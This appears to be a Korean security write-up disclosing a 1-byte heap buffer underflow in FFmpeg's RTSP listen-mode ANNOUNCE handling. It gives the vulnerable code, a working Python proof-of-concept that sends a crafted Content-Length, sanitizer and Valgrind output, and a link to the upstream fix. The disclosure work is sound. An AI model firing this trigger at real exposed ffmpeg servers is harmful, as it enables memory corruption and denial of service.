# `avformat/rtspdec`: 1-byte heap-buffer-underflow in `rtsp_read_announce`

FFmpeg는 거의 모든 컨테이너·코덱·프로토콜을 다 다루는, 멀티미디어 분야에서 사실상 표준에 가까운 오픈소스 라이브러리다.
클라이언트 단말뿐 아니라 서버·게이트웨이·트랜스코더·녹화 파이프라인에 광범위하게 박혀 있어서 외부 노출 면적이 상당히 넓다.

`libavformat`의 RTSP 처리 코드를 보고 있다가 `-rtsp_flags listen`이라는 옵션이 눈에 들어왔다. 
ffmpeg가 RTSP 클라이언트로 동작하는 흔한 케이스 말고, 반대로 **서버처럼 동작하면서 클라이언트의 요청을 받는** 모드다. 
미디어 게이트웨이나 recording proxy 시나리오에서 쓰인다. 
그러면 이 모드에선 클라가 보낸 메시지를 어떻게 파싱하는지가 궁금해져서, `rtsp_listen()`과 그 안에서 호출되는 `rtsp_read_announce()`로 들어가서 알아보게 됐다. 
거기서 `Content-Length`를 처리하는 한 줄을 보다가 한 군데가 좀 이상해 보였다.

## 취약한 코드

`libavformat/rtspdec.c`의 `rtsp_read_announce()` 전체.

```c
177  static int rtsp_read_announce(AVFormatContext *s)
178  {
179      RTSPState *rt             = s->priv_data;
180      RTSPMessageHeader request = { 0 };
181      char *sdp;
182      int  ret;
183
184      ret = rtsp_read_request(s, &request, "ANNOUNCE");
185      if (ret)
186          return ret;
187      rt->seq++;
188      if (strcmp(request.content_type, "application/sdp")) {
189          av_log(s, AV_LOG_ERROR, "Unexpected content type %s\n",
190                 request.content_type);
191          rtsp_send_reply(s, RTSP_STATUS_SERVICE, NULL, request.seq);
192          return AVERROR_OPTION_NOT_FOUND;
193      }
194      if (request.content_length) {
195          sdp = av_malloc(request.content_length + 1);
196          if (!sdp)
197              return AVERROR(ENOMEM);
198
199          /* Read SDP */
200          if (ffurl_read_complete(rt->rtsp_hd, sdp, request.content_length)
201              < request.content_length) {
202              av_log(s, AV_LOG_ERROR,
203                     "Unable to get complete SDP Description in ANNOUNCE\n");
204              rtsp_send_reply(s, RTSP_STATUS_INTERNAL, NULL, request.seq);
205              av_free(sdp);
206              return AVERROR(EIO);
207          }
208          sdp[request.content_length] = '\0';
209          av_log(s, AV_LOG_VERBOSE, "SDP: %s\n", sdp);
210          ret = ff_sdp_parse(s, sdp);
211          av_free(sdp);
212          if (ret)
213              return ret;
214          rtsp_send_reply(s, RTSP_STATUS_OK, NULL, request.seq);
215          return 0;
216      }
217      av_log(s, AV_LOG_ERROR,
218             "Content-Length header value exceeds sdp allocated buffer (4KB)\n");
219      rtsp_send_reply(s, RTSP_STATUS_INTERNAL,
220                      "Content-Length exceeds buffer size", request.seq);
221      return AVERROR(EIO);
222  }
```

이 함수에서 눈여겨볼 곳은 두 줄이다.

- 라인 195 — `sdp = av_malloc(request.content_length + 1)` 로 할당을 잡고,
- 라인 208 — `sdp[request.content_length] = '\0'` 로 본문 끝에 NUL을 박는다.

그리고 `request.content_length`는 `int`이고, 그 값은 `ff_rtsp_parse_line()` 안에서 `strtol()`로 헤더를 파싱한 결과가 그대로 들어간다.

## 분석

aarch64 Linux는 LP64라서 `int`는 32-bit, `long`은 64-bit.
그리고 `strtol()`은 `long`을 반환한다.

클라가 `Content-Length: 4294967295`를 보내면 `strtol()`은 일단 `4294967295L`을 그대로 돌려준다 — 64-bit long에는 정상으로 들어가는 값이라 여기서는 사고가 안 난다.
사고는 그 결과를 `int` 필드로 대입하는 순간이다.
32-bit로 잘리면서 비트 패턴이 `0xFFFFFFFF`이 되고, signed int로 해석되면 **`-1`**이 된다.

이제 `request.content_length == -1`인 상태가 됐다.
0이 아니므로 `if (request.content_length)` 분기는 정상적으로 통과하고, 그대로 `av_malloc(content_length + 1)` — 즉 `av_malloc(0)`이 호출된다.

상식적으로는 `av_malloc(0)`이 NULL을 줘야 할 것 같지만, FFmpeg의 `av_malloc()`은 그렇게 동작하지 않는다.
`libavutil/mem.c`를 보면 zero-size 요청에 대해 폴백 경로로 작은 할당을 돌려주게 되어 있고, 이 빌드(`posix_memalign` 경로)에서는 정확히 **1바이트 영역**이 떨어진다.
그러니까 `sdp`는 NULL이 아니라 유효한 1바이트 영역을 가리키는 포인터다.

그 상태에서 라인 208이 실행되면 `sdp[request.content_length]`는 결국 `sdp[-1]`.
`sdp`가 가리키는 1바이트 영역의 **시작 주소 직전 1바이트**에 NUL이 박힌다.
이게 1-byte heap-buffer-underflow다.

## PoC

별도 미디어 파일은 필요 없다.
RTSP `ANNOUNCE` 요청 한 번이 전부.

```python
#!/usr/bin/env python3
import argparse, socket

p = argparse.ArgumentParser()
p.add_argument("host", nargs="?", default="127.0.0.1")
p.add_argument("port", nargs="?", type=int, default=8554)
p.add_argument("--value", default="4294967295")
p.add_argument("--path", default="poc")
p.add_argument("--body", default="v=0\r\n")
args = p.parse_args()

req = (
    f"ANNOUNCE rtsp://{args.host}:{args.port}/{args.path} RTSP/1.0\r\n"
    f"CSeq: 1\r\n"
    f"Content-Type: application/sdp\r\n"
    f"Content-Length: {args.value}\r\n"
    f"\r\n"
).encode("latin1") + args.body.encode("latin1")

s = socket.socket(); s.connect((args.host, args.port)); s.sendall(req)
print(s.recv(4096).decode("latin1", "ignore"))
s.close()
```

서버 쪽:

```bash
./ffmpeg_g -rtsp_flags listen -listen_timeout 10 \
           -i rtsp://127.0.0.1:8579/poc -f null -
```

PoC 한 번 던지면 끝.
`ANNOUNCE`만 받으면 트리거된다.

## ASan 출력

전체 덤프 그대로.

```text
=================================================================
==14140==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffa8e006cf at pc 0xaaaab9d15044 bp 0xffffda4ce160 sp 0xffffda4ce150
WRITE of size 1 at 0xffffa8e006cf thread T0
    #0 0xaaaab9d15040 in rtsp_read_announce libavformat/rtspdec.c:208
    #1 0xaaaab9d1ada0 in rtsp_listen libavformat/rtspdec.c:817
    #2 0xaaaab9d1b284 in rtsp_read_header libavformat/rtspdec.c:860
    #3 0xaaaab98b4f24 in avformat_open_input libavformat/demux.c:323
    #4 0xaaaab8b18e04 in ifile_open fftools/ffmpeg_demux.c:2155
    #5 0xaaaab8b79144 in open_files fftools/ffmpeg_opt.c:1465
    #6 0xaaaab8b79690 in ffmpeg_parse_options fftools/ffmpeg_opt.c:1514
    #7 0xaaaab8bd4884 in main fftools/ffmpeg.c:1009
    #8 0xffffac2773fc in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #9 0xffffac2774d4 in __libc_start_main_impl ../csu/libc-start.c:392
    #10 0xaaaab8af24ec in _start (/analyze/FFmpeg/ffmpeg+0x5c24ec)

0xffffa8e006cf is located 1 bytes to the left of 1-byte region [0xffffa8e006d0,0xffffa8e006d1)
allocated by thread T0 here:
    #0 0xffffaccb0140 in __interceptor_posix_memalign ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:226
    #1 0xaaaabca48858 in av_malloc libavutil/mem.c:107
    #2 0xaaaabca488cc in av_malloc libavutil/mem.c:146
    #3 0xaaaab9d14ddc in rtsp_read_announce libavformat/rtspdec.c:195
    #4 0xaaaab9d1ada0 in rtsp_listen libavformat/rtspdec.c:817
    #5 0xaaaab9d1b284 in rtsp_read_header libavformat/rtspdec.c:860
    #6 0xaaaab98b4f24 in avformat_open_input libavformat/demux.c:323
    #7 0xaaaab8b18e04 in ifile_open fftools/ffmpeg_demux.c:2155
    #8 0xaaaab8b79144 in open_files fftools/ffmpeg_opt.c:1465
    #9 0xaaaab8b79690 in ffmpeg_parse_options fftools/ffmpeg_opt.c:1514
    #10 0xaaaab8bd4884 in main fftools/ffmpeg.c:1009
    #11 0xffffac2773fc in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #12 0xffffac2774d4 in __libc_start_main_impl ../csu/libc-start.c:392
    #13 0xaaaab8af24ec in _start (/analyze/FFmpeg/ffmpeg+0x5c24ec)

SUMMARY: AddressSanitizer: heap-buffer-overflow libavformat/rtspdec.c:208 in rtsp_read_announce
Shadow bytes around the buggy address:
  0x200ff51c0080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c0090: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c00a0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c00b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x200ff51c00c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x200ff51c00d0: fa fa fa fa fa fa fa fa fa[fa]01 fa fa fa fa fa
  0x200ff51c00e0: fd fd fa fa fa fa fd fd fd fa fa fa fd fd fa fa
  0x200ff51c00f0: fa fa fd fd fd fa fa fa fd fa fa fa fa fa fd fd
  0x200ff51c0100: fa fa fa fa fd fd fd fa fa fa fd fd fa fa fa fa
  0x200ff51c0110: fd fd fd fa fa fa fd fd fa fa fa fa fd fd fd fa
  0x200ff51c0120: fa fa fd fd fa fa fa fa fd fd fd fa fa fa 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==14140==ABORTING
```

핵심만 짚으면:

- write 주소 `0xffffa8e006cf`, 할당 영역 `[0xffffa8e006d0, 0xffffa8e006d1)` — **딱 1바이트**, write는 영역 시작보다 정확히 1바이트 앞
- write의 콜스택은 `rtspdec.c:208`, allocation의 콜스택은 `rtspdec.c:195` — 코드 분석과 정확히 일치
- shadow map의 화살표(`=>`) 줄을 보면 buggy address의 shadow 바이트는 `[fa]` (heap left redzone)이고, 그 바로 다음이 `01` (partially addressable — 1바이트 할당의 표식). 정확히 "1바이트 할당의 redzone 영역에 1바이트 write" 그림

## Valgrind 결과

ASan 없는 별도 debug 빌드에서 Memcheck로도 돌렸다.
같은 underflow가 잡히고, Valgrind는 동일한 사실을 다른 워딩으로 보고한다("1 byte before a block of size 1").

```text
==27946== Invalid write of size 1
==27946==    at 0x8D66D4: rtsp_read_announce (rtspdec.c:208)
...
==27946==  Address 0x52b4eef is 1 bytes before a block of size 1 alloc'd
==27946==    by 0x19AA667: av_malloc (mem.c:107)
==27946==    by 0x19AA69B: av_malloc (mem.c:146)
==27946==    by 0x8D6643: rtsp_read_announce (rtspdec.c:195)
```

여기서 Valgrind가 추가로 잡아주는 게 있다.
그 1바이트 underflow 외에도, 직후 코드 경로에서 **uninitialised value 3건**이 더 보고된다.

라인 209 — `av_log` 경로 안의 `strlen`이 uninit 메모리를 읽는다.

```text
==27946== Conditional jump or move depends on uninitialised value(s)
==27946==    at 0x486B2A8: __GI_strlen
==27946==    by ... __vfprintf_internal / vsnprintf
==27946==    by ... av_vbprintf / format_line / av_log_default_callback
==27946==    by 0x8D66EF: rtsp_read_announce (rtspdec.c:209)
```

라인 210 — `ff_sdp_parse()` 안의 `strspn`도 동일한 uninit 영역 위에서 conditional jump.

```text
==27946== Conditional jump or move depends on uninitialised value(s)
==27946==    at 0x4870478: strspn
==27946==    by 0x8CF8EB: ff_sdp_parse (rtsp.c:761)
==27946==    by 0x8D66FB: rtsp_read_announce (rtspdec.c:210)
```

정리하면 — 핵심 primitive는 라인 208의 `sdp[-1] = '\0'` 1바이트지만, 그 자리에서 끝나는 게 아니다.

- 라인 208 — `sdp[-1]`에 NUL 1바이트 박힘 (실제 underflow)
- 라인 209 — 그 뒤 `av_log()` 호출 경로의 포맷 처리 중 `strlen`이 NUL 종료 안 된 영역을 읽음
- 라인 210 — `ff_sdp_parse()`가 같은 영역 위에서 `strspn` 등을 돌리며 conditional jump

즉 1바이트 손상 자체로 끝나지 않고, 그 직후 로깅·SDP 파싱 경로 전체가 unsanitized 메모리에 의해 휩쓸린다.
"1바이트라 별것 아니네" 하기엔 후속 흐름이 산만한 케이스.

## 패치

upstream 픽스 방향은 단순하다 — `Content-Length`를 파싱한 뒤 음수/0을 단일 사이트에서 거부.
어차피 `av_malloc(0)`은 의미 없는 케이스고, 음수는 더더욱.

merge 후로는 `Content-Length: 4294967295`(또는 어떤 식으로든 negative로 wrap 되는 값)는 `AVERROR_INVALIDDATA`로 일찍 거절된다.

→ [FFmpeg PR #22902](https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22902)

## 1바이트 NUL이 진짜로 위험한가?

이 글에선 exploitation까지는 안 갔다.
1바이트 NUL underflow의 천장은 상황에 강하게 의존한다 — 어디 glibc chunk 헤더 옆에 떨어지느냐, glibc 버전, `MALLOC_ARENA_*`, free chunk와의 인접성 등등.
거기까지 가지 않아도 다음 두 가지는 분명하다.

1. 분명한 메모리 손상이고, ASan과 Valgrind가 모두 동의한다.
2. 손상 직후 `av_log` / `ff_sdp_parse`가 같은 영역을 추가로 읽어 unsanitized 데이터가 logging/parsing 흐름으로 흘러간다.

RTSP listen mode가 외부 노출 모드(미디어 게이트웨이, recording proxy 등)로 운용되는 케이스가 적지 않으니, 프로토콜 레벨에서 단 한 번의 `ANNOUNCE`로 트리거된다는 사실 자체가 충분히 시사적이다.

---

링크
- PR: <https://code.ffmpeg.org/FFmpeg/FFmpeg/pulls/22902>
- File: `libavformat/rtspdec.c`
